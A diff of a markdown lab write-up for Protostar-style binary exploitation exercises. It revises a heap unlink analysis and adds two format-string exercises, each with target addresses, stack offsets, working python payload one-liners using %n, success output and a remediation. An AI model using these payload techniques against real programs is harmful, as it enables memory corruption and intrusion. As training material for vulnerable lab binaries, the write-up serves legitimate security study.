@@ -756,53 +756,127 @@ Replace `sprintf()` with `snprintf()` to specify and enforce a maximum destinati
 snprintf(buffer, sizeof(buffer), "%s", input);
 ```
 
+## ex06: Heap Unlink Exploitation
 
-## ex06: Heap Unlink Exploitation Technical Analysis
+The original Protostar Heap 3 exploit does not work directly on Hole-In-Bin because the runtime environment is different.
 
-## Overview
-Target: Redirect execution to `winner()` at `0x08048864`.  
-Baseline: Protostar Heap 3 (`heap3.c`) using classic `dlmalloc` `unlink()` metadata corruption via `free()`.
+### Main Differences
+
+- **Heap address changes:**  
+  Protostar uses a fixed heap around `0x0804c000`, while Hole-In-Bin uses a runtime-dependent heap address, for example:
+  `0x083d6000`, `0x0839c000`, `0x08a48000`.
+
+- **Different libc:**  
+  Protostar uses `libc-2.11.2`, while Hole-In-Bin uses `libc-2.19`.
+
+- **Hard-coded heap addresses are invalid:**  
+  For example, `0x0804c008` belongs to the Protostar heap, but is unmapped in Hole-In-Bin.
+
+- **Memory permissions matter:**  
+  `unlink()` performs pointer-based write-backs, so targeting read-only `.text` memory can cause `SIGSEGV`.  
+  Heap shellcode may also fail if the heap is non-executable (NX).
+
+### Conclusion
+
+The Protostar exploit cannot simply be copied to Hole-In-Bin. The heap layout, runtime addresses, libc version, and memory permissions must be re-evaluated for the new environment.
 
 ---
 
-## Technical Analysis: Why the Exploitation Fails on Modern Systems
+## ex07 - Format String Vulnerability 
 
-While the `unlink()` primitive successfully fires and overwrites `puts@GOT` (`0x0804b128`), execution fails with a Segmentation Fault (`SIGSEGV`) under modern Linux runtime environments due to two distinct memory protection mechanisms:
+#### Objective
 
-### 1. Read-Only Memory Violation on Unlink Write-Back
-The `unlink()` macro performs a dual-pointer assignment:
-1. `*(FD + 12) = BK` $\rightarrow$ Overwrites `puts@GOT` with the target address (Succeeds).
-2. `*(BK + 8) = FD` $\rightarrow$ Writes `FD` back into `BK + 8`.
+Modify the target variable entry using a format string vulnerability to reach the required length condition:
 
-* **The Problem:** Directing `BK` to point directly near `winner()` (`winner - 8` = `0x0804885c`) causes step 2 to attempt writing to `0x08048864`.
-* **The Crash:** Address `0x08048864` resides in the `.text` segment, which is mapped as **Read-Only (`R-X`)**. The kernel immediately aborts the process (`SIGSEGV`) inside `free()` at `malloc.c` during this write-back attempt.
-
-### 2. Non-Executable Heap (NX / DEP)
-* **The Problem:** Placing shellcode inside `Chunk A` (`0x0804c018`) and setting `BK` to point to it avoids the `.text` write-back crash because the heap is writable (`RW-`).
-* **The Crash:** The moment `puts()` is called and jumps to `0x0804c018`, the CPU triggers a `SIGSEGV` because modern memory pages allocated for the heap lack Execution permissions (`NX` protection active).
+> `you have modified the target :)`
 
 ---
 
-## Proof of Concept & Manual Control Flow Override
+#### Vulnerability
 
-Since heap execution is blocked by NX and direct `.text` patching is blocked by page permissions, control flow redirection to `winner()` was validated using runtime instruction pointer control within GDB:
+The program passes user-supplied input directly into `printf()` without a static format string specifier. This allows arbitrary write operations to memory locations using the `%n` specifier.
 
-```gdb
-# 1. Break at the final execution point (puts call)
-break *0x08048935
+---
 
-# 2. Run target with standard input arguments
-run AAAA BBBB CCCC
+#### Offset & Calculation
 
-# 3. Manually override EIP to target function
-set $eip = 0x08048864
-continue
+* **Target Address:** `0x080496e4` (`\xe4\x96\x04\x08` in Little-Endian)
+* **Stack Slot:** Slot 4 (`%4$n`)
+* **Padding:** 4 bytes (address) + 60 bytes (`%60x`) = 64 bytes total written to target memory.
+
+---
+
+#### Proof of Concept (PoC)
+
+```bash
+    python -c 'print "\xe4\x96\x04\x08" + "A"*60 + "%4$n"' | ./bin
 ```
 
-### Execution Result
+**Output:**
 
 ```text
-that wasn't too bad now, was it? @ 1787340387
+you have modified the target :)
+```
 
-Program received signal SIGSEGV, Segmentation fault.
+---
+
+#### Remediation
+
+Always specify a explicit format string when calling formatting functions:
+
+```c
+printf("%s", input);
+```
+
+---
+
+## ex08 - Format String / Single-Stage %n Write (format3)
+
+#### Objective
+
+Overwrite the target variable at address `0x080496f4` with the full target value to trigger the success check:
+
+> `you have modified the target :)`
+
+---
+
+#### Vulnerability
+
+The application passes user input directly from `fgets` to `printf` inside `printbuffer()` without a static format string. This permits arbitrary memory write primitives using `%n`.
+
+---
+
+#### Offset & Calculation
+
+* **Target Address:** `0x080496f4` (`\xf4\x96\x04\x08` in Little-Endian)
+* **Stack Slot:** Slot 12 (`%12$n`)
+* **Padding Calculation:**
+
+$$\text{pad} = 16930116 - 4 \text{ bytes (address)} = 16930112$$
+
+---
+
+#### Proof of Concept (PoC)
+
+```bash
+python -c 'print "\xf4\x96\x04\x08" + "%16930112c" + "%12$n"' | ./bin
+
+```
+
+**Output:**
+
+```text
+you have modified the target :)
+```
+
+---
+
+#### Remediation
+
+Ensure print functions strictly define format specifiers for external input:
+
+```c
+void printbuffer(char *buffer) {
+    printf("%s", buffer);
+}
 ```
